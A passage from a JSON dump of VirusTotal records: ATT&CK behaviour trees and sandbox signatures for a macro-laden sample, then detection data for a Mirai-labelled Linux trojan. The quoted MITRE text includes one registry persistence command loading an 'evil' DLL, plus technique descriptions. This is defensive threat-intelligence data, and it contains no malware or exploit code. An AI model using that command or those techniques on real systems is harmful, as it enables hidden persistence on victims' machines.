HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Stores files to the Windows startup directory"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates a start menu entry (Start Menu\\\\Programs\\\\Startup)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Found WSH timer for Javascript or VBS script (likely evasive script)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with functions possibly related to WSH operations (process, registry, environment, or keystrokes)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Document contains embedded VBA macros"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with functions possibly related to ADO stream file operations"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA macro with suspicious strings"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with many string operations indicating source code obfuscation"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes visual basic scripts"
                  },
                  {
                    "severity": "LOW",
                    "description": "Drops VBS files to the startup folder (C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA macro which may execute processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "Document contains an embedded VBA macro which executes code when the document is opened / closed"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\nSeveral types exist:\nBrowser-based Exploitation\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\nOffice Applications\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\nCommon Third-party Applications\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Potential document exploit detected (performs DNS queries)"
                  },
                  {
                    "severity": "HIGH",
                    "description": "Document exploit detected (creates forbidden files)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1203/",
                "id": "T1203",
                "name": "Exploitation for Client Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if Microsoft Office is installed"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Allocates a big amount of memory (probably used for heap s)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/011/",
                "id": "T1055.011",
                "name": "Extra Window Memory Injection"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Found WSH timer for Javascript or VBS script (likely evasive script)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with functions possibly related to WSH operations (process, registry, environment, or keystrokes)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Document contains embedded VBA macros"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with functions possibly related to ADO stream file operations"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA macro with suspicious strings"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with many string operations indicating source code obfuscation"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes visual basic scripts"
                  },
                  {
                    "severity": "LOW",
                    "description": "Drops VBS files to the startup folder (C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA macro which may execute processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "Document contains an embedded VBA macro which executes code when the document is opened / closed"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Document contains an embedded VBA with many string operations indicating source code obfuscation"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Allocates a big amount of memory (probably used for heap s)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/011/",
                "id": "T1055.011",
                "name": "Extra Window Memory Injection"
              },
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Stores files to the Windows startup directory"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates a start menu entry (Start Menu\\\\Programs\\\\Startup)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "DOCGuard": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Document contains macro has some blacklisted funcionts like Shell, Execute, Excel4Macro, CreateProcess etc.."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Document contains macro has some blacklisted funcionts like Shell, Execute, Excel4Macro, CreateProcess etc.."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "6596a62a06bafd61c48fcc5d"
  },
  "data": {
    "attributes": {
      "type_description": "ELF",
      "tlsh": "T1A7C32940F68780F4E8070DB4806E773FCB32B52D8839976ADFA4FF55D967A50352A24A",
      "vhash": "7bb8336eb02c878841bb63e512d6698e",
      "type_tags": [
        "executable",
        "linux",
        "elf"
      ],
      "crowdsourced_yara_results": [
        {
          "ruleset_id": "01597004d0",
          "rule_name": "Linux_Trojan_Mirai_268aac0b",
          "ruleset_name": "Linux_Trojan_Mirai",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        },
        {
          "ruleset_id": "01597004d0",
          "rule_name": "Linux_Trojan_Mirai_88de437f",
          "ruleset_name": "Linux_Trojan_Mirai",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        },
        {
          "ruleset_id": "01597004d0",
          "rule_name": "Linux_Trojan_Mirai_cc93863b",
          "ruleset_name": "Linux_Trojan_Mirai",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        },
        {
          "ruleset_id": "01597004d0",
          "rule_name": "Linux_Trojan_Mirai_0cb1699c",
          "ruleset_name": "Linux_Trojan_Mirai",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        }
      ],
      "telfhash": "t1494178bb2e662aecb3c0e881c39f6a90ee7dd177359035bc05721bd452f2a50a169c74",
      "names": [
        "unknown",
        "youtube",
        "91c36bd124e4c8f7a2bc6b6d01324d3c.virus"
      ],
      "last_modification_date": 1704368697,
      "type_tag": "elf",
      "elf_info": {
        "header": {
          "hdr_version": "1 (current)",
          "type": "EXEC (Executable file)",
          "obj_version": "0x1",
          "data": "2's complement, little endian",
          "machine": "Intel 80386",
          "num_section_headers": 10,
          "os_abi": "UNIX - System V",
          "abi_version": 0,
          "entrypoint": 134513000,
          "num_prog_headers": 3,
          "class": "ELF32"
        },
        "section_list": [
          {
            "name": "",
            "section_type": "NULL",
            "virtual_address": 0,
            "physical_offset": 0,
            "flags": "",
            "size": 0
          },
          {
            "name": ".init",
            "section_type": "PROGBITS",
            "virtual_address": 134512788,
            "physical_offset": 148,
            "flags": "AX",
            "size": 28
          },
          {
            "name": ".text",
            "section_type": "PROGBITS",
            "virtual_address": 134512816,
            "physical_offset": 176,
            "flags": "AX",
            "size": 111777
          },
          {
            "name": ".fini",
            "section_type": "PROGBITS",
            "virtual_address": 134624593,
            "physical_offset": 111953,
            "flags": "AX",
            "size": 23
          },
          {
            "name": ".rodata",
            "section_type": "PROGBITS",
            "virtual_address": 134624640,
            "physical_offset": 112000,
            "flags": "A",
            "size": 7743
          },
          {
            "name": ".ctors",
            "section_type": "PROGBITS",
            "virtual_address": 134636484,
            "physical_offset": 119748,
            "flags": "WA",
            "size": 8
          },
          {
            "name": ".dtors",
            "section_type": "PROGBITS",
            "virtual_address": 134636492,
            "physical_offset": 119756,
            "flags": "WA",
            "size": 8
          },
          {
            "name": ".data",
            "section_type": "PROGBITS",
            "virtual_address": 134636544,
            "physical_offset": 119808,
            "flags": "WA",
            "size": 8512
          },
          {
            "name": ".bss",
            "section_type": "NOBITS",
            "virtual_address": 134645056,
            "physical_offset": 128320,
            "flags": "WA",
            "size": 21248
          },
          {
            "name": ".shstrtab",
            "section_type": "STRTAB",
            "virtual_address": 0,
            "physical_offset": 128320,
            "flags": "",
            "size": 62
          }
        ],
        "segment_list": [
          {
            "segment_type": "LOAD",
            "resources": [
              ".init",
              ".text",
              ".fini",
              ".rodata"
            ]
          },
          {
            "segment_type": "LOAD",
            "resources": [
              ".ctors",
              ".dtors",
              ".data",
              ".bss"
            ]
          },
          {
            "segment_type": "GNU_STACK",
            "resources": []
          }
        ]
      },
      "times_submitted": 8,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 128784,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.mirai/bashlite",
        "popular_threat_category": [
          {
            "count": 24,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 20,
            "value": "mirai"
          },
          {
            "count": 2,
            "value": "bashlite"
          },
          {
            "count": 2,
            "value": "smjc"
          }
        ]
      },
      "detectiteasy": {
        "filetype": "ELF32",
        "values": [
          {
            "info": "EXEC 386-32",
            "type": "Operation system",
            "name": "Unix"
          }
        ]
      },
      "last_submission_date": 1697403841,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Linux.Mirai.K!c",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "Linux.Trojan.Mirai",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis!Trojan",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5026",
          "result": null,
